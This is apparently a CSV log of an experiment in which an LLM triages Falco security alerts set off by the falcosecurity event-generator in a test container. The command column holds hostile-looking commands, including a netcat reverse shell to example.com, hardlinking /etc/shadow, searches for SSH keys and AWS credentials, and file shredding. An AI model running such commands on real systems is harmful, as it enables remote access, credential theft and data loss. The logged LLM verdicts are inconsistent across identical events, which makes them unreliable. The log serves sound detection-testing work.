timestamp,event_type,rule_name,priority,prompt_tokens,completion_tokens,latency_ms,remediation_status,remediation_action,mitre_technique,target_container,attack_source,attack_label,attack_id,container_id,container_image,event_source,experiment_mode,ground_truth,rule_matched,llm_called,cache_hit,cache_key,gate_decision,llm_action,llm_threat_level,cache_ttl
2026-05-17T11:51:52.303197,cache-hit,Packet socket created in container,Notice,0,0,0,ignored,,,,manual,Packet socket created in container,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,50444a11263ba4bdc942b447dce33e70,cache-hit,pause,medium,3600
2026-05-17T11:51:53.881859,rule-matched,Read sensitive file untrusted,Warning,0,0,0,skipped,,T1083,falco-event-generator,manual,Read sensitive file untrusted,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,1,0,0,,rule,,,3600
2026-05-17T11:51:55.467444,rule-matched,Run shell untrusted,Notice,0,0,0,skipped,,T1059,falco-event-generator,manual,Run shell untrusted,sh -c ls > /dev/null,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,1,0,0,,rule,,,3600
2026-05-17T11:51:57.046090,cache-hit,Fileless execution via memfd_create,Critical,0,0,0,ignored,,,,manual,Fileless execution via memfd_create,4 run helper.DoNothing,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,ed1d903fc003a9a58bc1a53dc4c8ee7d,cache-hit,alert,high,3600
2026-05-17T11:51:58.624982,cache-hit,Create Hardlink Over Sensitive Files,Warning,0,0,0,ignored,,,,manual,Create Hardlink Over Sensitive Files,ln -v /etc/shadow /tmp/falco-event-generator-syscall-CreateHardlinkOverSensitiveFiles-3885503366/shadow_link,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,ce29cc75814d17294a676363d10f7622,cache-hit,alert,high,3600
2026-05-17T11:52:00.204175,cache-hit,System user interactive,Informational,0,0,0,ignored,,,,manual,System user interactive,login,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,256d745947e9b7d7eae333d0ebd169e3,cache-hit,alert,high,3600
2026-05-17T11:52:01.783636,rule-matched,Drop and execute new binary in container,Critical,0,0,0,skipped,,T1485,falco-event-generator,manual,Drop and execute new binary in container,falco-event-gen,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,1,0,0,,rule,,,3600
2026-05-17T11:52:03.372955,cache-hit,PTRACE anti-debug attempt,Notice,0,0,0,ignored,,,,manual,PTRACE anti-debug attempt,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,1e39dfc23dcf83ae7a47a9666599847c,cache-hit,alert,high,3600
2026-05-17T11:52:04.952104,rule-matched,Drop and execute new binary in container,Critical,0,0,0,skipped,,T1485,falco-event-generator,manual,Drop and execute new binary in container,falco-event-gen,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,1,0,0,,rule,,,3600
2026-05-17T11:52:06.536047,cache-hit,PTRACE anti-debug attempt,Notice,0,0,0,ignored,,,,manual,PTRACE anti-debug attempt,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,1e39dfc23dcf83ae7a47a9666599847c,cache-hit,alert,high,3600
2026-05-17T11:52:08.114725,rule-matched,PTRACE attached to process,Warning,0,0,0,skipped,,T1068,falco-event-generator,manual,PTRACE attached to process,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,1,0,0,,rule,,,3600
2026-05-17T11:52:09.694987,cache-hit,Search Private Keys or Passwords,Warning,0,0,0,ignored,,,,manual,Search Private Keys or Passwords,find /tmp -maxdepth 1 -iname id_rsa,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,3a08e749a190242c74492afdfc1de468,cache-hit,alert,medium,3600
2026-05-17T11:52:11.274141,cache-hit,Directory traversal monitored file read,Warning,0,0,0,ignored,,,,manual,Directory traversal monitored file read,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,6b25374d77be2bccc3489c6473bdb223,cache-hit,alert,medium,3600
2026-05-17T11:52:12.852283,cache-hit,Read sensitive file trusted after startup,Warning,0,0,0,ignored,,,,manual,Read sensitive file trusted after startup,httpd --loglevel info run ^syscall.ReadSensitiveFileUntrusted$ --sleep 6s,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,b7d41082564995db77d6b74b75a4f3d2,cache-hit,alert,medium,3600
2026-05-17T11:52:14.432039,cache-hit,Disallowed SSH Connection Non Standard Port,Notice,0,0,0,ignored,,,,manual,Disallowed SSH Connection Non Standard Port,ssh user@example.com -p 443,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,629494c6c6d948ac631c427d8d609862,cache-hit,pause,medium,3600
2026-05-17T11:52:16.011353,cache-hit,Find AWS Credentials,Warning,0,0,0,ignored,,,,manual,Find AWS Credentials,find /tmp -maxdepth 1 -iname .aws/credentials,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,b95c830e335267463f9a43857f2ed885,cache-hit,alert,high,3600
2026-05-17T11:52:17.600191,cache-hit,Remove Bulk Data from Disk,Warning,0,0,0,ignored,,,,manual,Remove Bulk Data from Disk,shred -u /tmp/falco-event-generator-syscall-RemoveBulkDataFromDisk-3677611856,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,6c972ecf189eefa9be9e4d28f665b944,cache-hit,alert,medium,3600
2026-05-17T11:52:19.179089,cache-hit,Execution from /dev/shm,Warning,0,0,0,ignored,,,,manual,Execution from /dev/shm,sh -c /dev/shm/falco-event-generator-syscall-ExecutionFromDevShm-WyYBXH.sh,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,4e4f7083604fc1fe55707f472ebe6270,cache-hit,alert,high,3600
2026-05-17T11:52:20.758011,cache-hit,Execution from /dev/shm,Warning,0,0,0,ignored,,,,manual,Execution from /dev/shm,sh -c /dev/shm/falco-event-generator-syscall-ExecutionFromDevShm-WyYBXH.sh,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,4e4f7083604fc1fe55707f472ebe6270,cache-hit,alert,high,3600
2026-05-17T11:52:22.336675,cache-hit,Clear Log Activities,Warning,0,0,0,ignored,,,,manual,Clear Log Activities,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,357658d27e05316e491368365302d386,cache-hit,alert,medium,3600
2026-05-17T12:12:15.194998,llm-analyzed,Read sensitive file trusted after startup,Warning,381,85,13343,ignored,,,,manual,Read sensitive file trusted after startup,httpd --loglevel info run ^syscall.ReadSensitiveFileUntrusted$ --sleep 6s,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,b7d41082564995db77d6b74b75a4f3d2,llm,pause,medium,30
2026-05-17T12:12:25.587959,llm-analyzed,Disallowed SSH Connection Non Standard Port,Notice,383,66,8809,ignored,,,,manual,Disallowed SSH Connection Non Standard Port,ssh user@example.com -p 443,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,629494c6c6d948ac631c427d8d609862,llm,pause,medium,30
2026-05-17T12:12:37.134320,llm-analyzed,Find AWS Credentials,Warning,367,67,9961,ignored,,,,manual,Find AWS Credentials,find /tmp -maxdepth 1 -iname .aws/credentials,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,b95c830e335267463f9a43857f2ed885,llm,alert,medium,30
2026-05-17T12:12:58.155090,llm-analyzed,Remove Bulk Data from Disk,Warning,385,63,19337,ignored,,,,manual,Remove Bulk Data from Disk,shred -u /tmp/falco-event-generator-syscall-RemoveBulkDataFromDisk-1257058840,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,6c972ecf189eefa9be9e4d28f665b944,llm,pause,medium,30
2026-05-17T12:13:20.580463,llm-analyzed,Execution from /dev/shm,Warning,408,70,20750,ignored,,,,manual,Execution from /dev/shm,sh -c /dev/shm/falco-event-generator-syscall-ExecutionFromDevShm-wSJ2IH.sh,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,4e4f7083604fc1fe55707f472ebe6270,llm,ignore,high,30
2026-05-17T12:13:22.160928,cache-hit,Execution from /dev/shm,Warning,0,0,0,ignored,,,,manual,Execution from /dev/shm,sh -c /dev/shm/falco-event-generator-syscall-ExecutionFromDevShm-wSJ2IH.sh,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,4e4f7083604fc1fe55707f472ebe6270,cache-hit,ignore,high,30
2026-05-17T12:13:31.473771,llm-analyzed,Clear Log Activities,Warning,342,57,7726,ignored,,,,manual,Clear Log Activities,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,357658d27e05316e491368365302d386,llm,alert,high,30
2026-05-17T12:13:41.478339,llm-analyzed,Create Symlink Over Sensitive Files,Warning,408,49,8420,ignored,,,,manual,Create Symlink Over Sensitive Files,ln -s /etc /tmp/falco-event-generator-syscall-CreateSymlinkOverSensitiveFiles-87276934/etc_link,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,aa21b1177c801979bea62a239e056977,llm,pause,medium,30
2026-05-17T12:13:51.465846,llm-analyzed,Directory traversal monitored file read,Warning,350,70,8401,ignored,,,,manual,Directory traversal monitored file read,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,6b25374d77be2bccc3489c6473bdb223,llm,alert,high,30
2026-05-17T12:14:01.315193,llm-analyzed,Read sensitive file trusted after startup,Warning,381,57,8267,ignored,,,,manual,Read sensitive file trusted after startup,httpd --loglevel info run ^syscall.ReadSensitiveFileUntrusted$ --sleep 6s,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,b7d41082564995db77d6b74b75a4f3d2,llm,alert,medium,30
2026-05-17T12:14:12.679289,llm-analyzed,Disallowed SSH Connection Non Standard Port,Notice,383,88,9783,ignored,,,,manual,Disallowed SSH Connection Non Standard Port,ssh user@example.com -p 443,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,629494c6c6d948ac631c427d8d609862,llm,alert,high,30
2026-05-17T12:14:22.157490,llm-analyzed,Find AWS Credentials,Warning,367,55,7893,ignored,,,,manual,Find AWS Credentials,find /tmp -maxdepth 1 -iname .aws/credentials,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,b95c830e335267463f9a43857f2ed885,llm,alert,high,30
2026-05-17T12:14:32.710531,llm-analyzed,Remove Bulk Data from Disk,Warning,381,71,8970,ignored,,,,manual,Remove Bulk Data from Disk,shred -u /tmp/falco-event-generator-syscall-RemoveBulkDataFromDisk-28908837,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,6c972ecf189eefa9be9e4d28f665b944,llm,alert,high,30
2026-05-17T12:14:45.486068,llm-analyzed,Execution from /dev/shm,Warning,410,96,11195,ignored,,,,manual,Execution from /dev/shm,sh -c /dev/shm/falco-event-generator-syscall-ExecutionFromDevShm-t4aVVv.sh,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,4e4f7083604fc1fe55707f472ebe6270,llm,pause,medium,30
2026-05-17T12:14:47.067091,cache-hit,Execution from /dev/shm,Warning,0,0,0,ignored,,,,manual,Execution from /dev/shm,sh -c /dev/shm/falco-event-generator-syscall-ExecutionFromDevShm-t4aVVv.sh,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,4e4f7083604fc1fe55707f472ebe6270,cache-hit,pause,medium,30
2026-05-17T12:14:56.589508,llm-analyzed,Clear Log Activities,Warning,343,61,7943,ignored,,,,manual,Clear Log Activities,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,357658d27e05316e491368365302d386,llm,alert,high,30
2026-05-17T12:15:07.210875,llm-analyzed,Create Symlink Over Sensitive Files,Warning,414,59,9041,ignored,,,,manual,Create Symlink Over Sensitive Files,ln -s /etc /tmp/falco-event-generator-syscall-CreateSymlinkOverSensitiveFiles-3474911395/etc_link,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,aa21b1177c801979bea62a239e056977,llm,alert,medium,30
2026-05-17T12:15:08.790923,rule-matched,Netcat Remote Code Execution in Container,Warning,0,0,0,skipped,,T1059,falco-event-generator,manual,Netcat Remote Code Execution in Container,nc -e /bin/sh example.com 22,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,1,0,0,,rule,,,30
2026-05-17T12:15:19.208442,llm-analyzed,Packet socket created in container,Notice,363,75,8837,ignored,,,,manual,Packet socket created in container,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,50444a11263ba4bdc942b447dce33e70,llm,alert,high,30
2026-05-17T12:15:20.789364,rule-matched,Read sensitive file untrusted,Warning,0,0,0,skipped,,T1083,falco-event-generator,manual,Read sensitive file untrusted,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,1,0,0,,rule,,,30
2026-05-17T12:15:22.378682,rule-matched,Run shell untrusted,Notice,0,0,0,skipped,,T1059,falco-event-generator,manual,Run shell untrusted,sh -c ls > /dev/null,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,1,0,0,,rule,,,30
2026-05-17T12:15:32.895868,llm-analyzed,Fileless execution via memfd_create,Critical,376,72,8937,ignored,,,,manual,Fileless execution via memfd_create,4 run helper.DoNothing,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,ed1d903fc003a9a58bc1a53dc4c8ee7d,llm,alert,medium,30
2026-05-17T12:15:45.178013,llm-analyzed,Create Hardlink Over Sensitive Files,Warning,421,95,10700,ignored,,,,manual,Create Hardlink Over Sensitive Files,ln -v /etc/shadow /tmp/falco-event-generator-syscall-CreateHardlinkOverSensitiveFiles-1954026859/shadow_link,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,ce29cc75814d17294a676363d10f7622,llm,pause,medium,30
2026-05-17T12:15:54.345219,llm-analyzed,System user interactive,Informational,314,69,7588,ignored,,,,manual,System user interactive,login,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,256d745947e9b7d7eae333d0ebd169e3,llm,pause,high,30
2026-05-17T12:15:55.924455,rule-matched,Drop and execute new binary in container,Critical,0,0,0,skipped,,T1485,falco-event-generator,manual,Drop and execute new binary in container,falco-event-gen,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,1,0,0,,rule,,,30
2026-05-17T12:16:05.756080,llm-analyzed,PTRACE anti-debug attempt,Notice,331,74,8246,ignored,,,,manual,PTRACE anti-debug attempt,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,1e39dfc23dcf83ae7a47a9666599847c,llm,alert,high,30
2026-05-17T12:16:07.336221,rule-matched,PTRACE attached to process,Warning,0,0,0,skipped,,T1068,falco-event-generator,manual,PTRACE attached to process,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,1,0,0,,rule,,,30
2026-05-17T12:16:19.870507,llm-analyzed,Search Private Keys or Passwords,Warning,342,123,10955,ignored,,,,manual,Search Private Keys or Passwords,find /tmp -maxdepth 1 -iname id_rsa,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,3a08e749a190242c74492afdfc1de468,llm,alert,high,30
2026-05-17T12:16:30.136726,llm-analyzed,Read sensitive file trusted after startup,Warning,381,66,8686,ignored,,,,manual,Read sensitive file trusted after startup,httpd --loglevel info run ^syscall.ReadSensitiveFileUntrusted$ --sleep 6s,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,b7d41082564995db77d6b74b75a4f3d2,llm,alert,high,30
2026-05-17T12:16:40.121413,llm-analyzed,Disallowed SSH Connection Non Standard Port,Notice,384,60,8402,ignored,,,,manual,Disallowed SSH Connection Non Standard Port,ssh user@example.com -p 443,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,629494c6c6d948ac631c427d8d609862,llm,pause,medium,30
2026-05-17T12:16:49.680185,llm-analyzed,Find AWS Credentials,Warning,367,57,7966,ignored,,,,manual,Find AWS Credentials,find /tmp -maxdepth 1 -iname .aws/credentials,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,b95c830e335267463f9a43857f2ed885,llm,alert,medium,30
2026-05-17T12:16:59.118420,llm-analyzed,Remove Bulk Data from Disk,Warning,385,46,7858,ignored,,,,manual,Remove Bulk Data from Disk,shred -u /tmp/falco-event-generator-syscall-RemoveBulkDataFromDisk-3864659558,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,6c972ecf189eefa9be9e4d28f665b944,llm,pause,medium,30
2026-05-17T12:17:10.942982,llm-analyzed,Execution from /dev/shm,Warning,410,86,10244,ignored,,,,manual,Execution from /dev/shm,sh -c /dev/shm/falco-event-generator-syscall-ExecutionFromDevShm-xs2H2j.sh,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,4e4f7083604fc1fe55707f472ebe6270,llm,alert,high,30
2026-05-17T12:17:12.524981,cache-hit,Execution from /dev/shm,Warning,0,0,0,ignored,,,,manual,Execution from /dev/shm,sh -c /dev/shm/falco-event-generator-syscall-ExecutionFromDevShm-xs2H2j.sh,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,4e4f7083604fc1fe55707f472ebe6270,cache-hit,alert,high,30
2026-05-17T12:17:21.830565,llm-analyzed,Clear Log Activities,Warning,343,59,7726,ignored,,,,manual,Clear Log Activities,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,357658d27e05316e491368365302d386,llm,alert,medium,30
2026-05-17T12:17:32.976109,llm-analyzed,Create Symlink Over Sensitive Files,Warning,414,72,9566,ignored,,,,manual,Create Symlink Over Sensitive Files,ln -s /etc /tmp/falco-event-generator-syscall-CreateSymlinkOverSensitiveFiles-1807769247/etc_link,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,aa21b1177c801979bea62a239e056977,llm,pause,medium,30
2026-05-17T12:17:34.553632,rule-matched,Netcat Remote Code Execution in Container,Warning,0,0,0,skipped,,T1059,falco-event-generator,manual,Netcat Remote Code Execution in Container,nc -e /bin/sh example.com 22,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,1,0,0,,rule,,,30
2026-05-17T12:17:44.755026,llm-analyzed,Packet socket created in container,Notice,363,57,8423,ignored,,,,manual,Packet socket created in container,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,50444a11263ba4bdc942b447dce33e70,llm,pause,medium,30
2026-05-17T12:17:46.334622,rule-matched,Read sensitive file untrusted,Warning,0,0,0,skipped,,T1083,falco-event-generator,manual,Read sensitive file untrusted,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,1,0,0,,rule,,,30
2026-05-17T12:17:47.925769,rule-matched,Run shell untrusted,Notice,0,0,0,skipped,,T1059,falco-event-generator,manual,Run shell untrusted,sh -c ls > /dev/null,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,1,0,0,,rule,,,30
2026-05-17T12:17:57.634122,llm-analyzed,Fileless execution via memfd_create,Critical,376,53,8126,ignored,,,,manual,Fileless execution via memfd_create,4 run helper.DoNothing,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,ed1d903fc003a9a58bc1a53dc4c8ee7d,llm,alert,medium,30
2026-05-17T12:18:08.188360,llm-analyzed,Create Hardlink Over Sensitive Files,Warning,421,59,8962,ignored,,,,manual,Create Hardlink Over Sensitive Files,ln -v /etc/shadow /tmp/falco-event-generator-syscall-CreateHardlinkOverSensitiveFiles-1864564634/shadow_link,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,ce29cc75814d17294a676363d10f7622,llm,pause,high,30
2026-05-17T12:18:17.671372,llm-analyzed,System user interactive,Informational,314,75,7902,ignored,,,,manual,System user interactive,login,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,256d745947e9b7d7eae333d0ebd169e3,llm,alert,high,30
2026-05-17T12:18:19.250640,rule-matched,Drop and execute new binary in container,Critical,0,0,0,skipped,,T1485,falco-event-generator,manual,Drop and execute new binary in container,falco-event-gen,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,1,0,0,,rule,,,30
2026-05-17T12:18:28.231327,llm-analyzed,PTRACE anti-debug attempt,Notice,331,56,7401,ignored,,,,manual,PTRACE anti-debug attempt,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,1e39dfc23dcf83ae7a47a9666599847c,llm,alert,high,30
2026-05-17T12:18:29.811275,rule-matched,PTRACE attached to process,Warning,0,0,0,skipped,,T1068,falco-event-generator,manual,PTRACE attached to process,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,1,0,0,,rule,,,30
2026-05-17T12:18:39.218268,llm-analyzed,Search Private Keys or Passwords,Warning,342,60,7826,ignored,,,,manual,Search Private Keys or Passwords,find /tmp -maxdepth 1 -iname id_rsa,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,3a08e749a190242c74492afdfc1de468,llm,pause,medium,30
2026-05-17T12:18:49.471114,llm-analyzed,Directory traversal monitored file read,Warning,350,76,8671,ignored,,,,manual,Directory traversal monitored file read,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,6b25374d77be2bccc3489c6473bdb223,llm,pause,medium,30
2026-05-17T12:18:51.063289,cache-hit,PTRACE anti-debug attempt,Notice,0,0,0,ignored,,,,manual,PTRACE anti-debug attempt,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,1e39dfc23dcf83ae7a47a9666599847c,cache-hit,alert,high,30
2026-05-17T12:18:52.643231,rule-matched,PTRACE attached to process,Warning,0,0,0,skipped,,T1068,falco-event-generator,manual,PTRACE attached to process,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,1,0,0,,rule,,,30
2026-05-17T12:18:54.222519,cache-hit,Search Private Keys or Passwords,Warning,0,0,0,ignored,,,,manual,Search Private Keys or Passwords,find /tmp -maxdepth 1 -iname id_rsa,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,3a08e749a190242c74492afdfc1de468,cache-hit,pause,medium,30
2026-05-17T12:18:55.804165,cache-hit,Directory traversal monitored file read,Warning,0,0,0,ignored,,,,manual,Directory traversal monitored file read,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,6b25374d77be2bccc3489c6473bdb223,cache-hit,pause,medium,30
2026-05-17T12:19:05.652837,llm-analyzed,Read sensitive file trusted after startup,Warning,381,55,8267,ignored,,,,manual,Read sensitive file trusted after startup,httpd --loglevel info run ^syscall.ReadSensitiveFileUntrusted$ --sleep 6s,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,b7d41082564995db77d6b74b75a4f3d2,llm,alert,medium,30
2026-05-17T12:19:16.564652,llm-analyzed,Disallowed SSH Connection Non Standard Port,Notice,384,80,9332,ignored,,,,manual,Disallowed SSH Connection Non Standard Port,ssh user@example.com -p 443,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,629494c6c6d948ac631c427d8d609862,llm,alert,high,30
2026-05-17T12:19:26.739151,llm-analyzed,Find AWS Credentials,Warning,367,68,8592,ignored,,,,manual,Find AWS Credentials,find /tmp -maxdepth 1 -iname .aws/credentials,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,b95c830e335267463f9a43857f2ed885,llm,alert,medium,30
2026-05-17T12:19:40.047927,llm-analyzed,Remove Bulk Data from Disk,Warning,385,110,11729,ignored,,,,manual,Remove Bulk Data from Disk,shred -u /tmp/falco-event-generator-syscall-RemoveBulkDataFromDisk-1056880682,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,6c972ecf189eefa9be9e4d28f665b944,llm,pause,medium,30
2026-05-17T12:19:51.911478,llm-analyzed,Execution from /dev/shm,Warning,412,63,10256,ignored,,,,manual,Execution from /dev/shm,sh -c /dev/shm/falco-event-generator-syscall-ExecutionFromDevShm-q7s62N.sh,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,4e4f7083604fc1fe55707f472ebe6270,llm,pause,high,30
2026-05-17T12:19:53.494554,cache-hit,Execution from /dev/shm,Warning,0,0,0,ignored,,,,manual,Execution from /dev/shm,sh -c /dev/shm/falco-event-generator-syscall-ExecutionFromDevShm-q7s62N.sh,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,4e4f7083604fc1fe55707f472ebe6270,cache-hit,pause,high,30
2026-05-17T12:20:03.950862,llm-analyzed,Clear Log Activities,Warning,343,79,8877,ignored,,,,manual,Clear Log Activities,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,357658d27e05316e491368365302d386,llm,alert,high,30
2026-05-17T12:20:14.442611,llm-analyzed,Create Symlink Over Sensitive Files,Warning,411,58,8909,ignored,,,,manual,Create Symlink Over Sensitive Files,ln -s /etc /tmp/falco-event-generator-syscall-CreateSymlinkOverSensitiveFiles-685563460/etc_link,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,aa21b1177c801979bea62a239e056977,llm,alert,high,30
2026-05-17T12:20:16.021759,rule-matched,Netcat Remote Code Execution in Container,Warning,0,0,0,skipped,,T1059,falco-event-generator,manual,Netcat Remote Code Execution in Container,nc -e /bin/sh example.com 22,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,1,0,0,,rule,,,30
2026-05-17T12:20:25.571139,llm-analyzed,Packet socket created in container,Notice,363,53,7967,ignored,,,,manual,Packet socket created in container,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,50444a11263ba4bdc942b447dce33e70,llm,alert,medium,30
2026-05-17T12:20:27.155352,rule-matched,Read sensitive file untrusted,Warning,0,0,0,skipped,,T1083,falco-event-generator,manual,Read sensitive file untrusted,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,1,0,0,,rule,,,30
2026-05-17T12:20:28.734070,rule-matched,Run shell untrusted,Notice,0,0,0,skipped,,T1059,falco-event-generator,manual,Run shell untrusted,sh -c ls > /dev/null,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,1,0,0,,rule,,,30
2026-05-17T12:20:39.836352,llm-analyzed,Fileless execution via memfd_create,Critical,376,82,9522,ignored,,,,manual,Fileless execution via memfd_create,4 run helper.DoNothing,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,ed1d903fc003a9a58bc1a53dc4c8ee7d,llm,alert,high,30
2026-05-17T12:20:51.229295,llm-analyzed,Create Hardlink Over Sensitive Files,Warning,418,74,9813,ignored,,,,manual,Create Hardlink Over Sensitive Files,ln -v /etc/shadow /tmp/falco-event-generator-syscall-CreateHardlinkOverSensitiveFiles-861507121/shadow_link,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,ce29cc75814d17294a676363d10f7622,llm,pause,medium,30
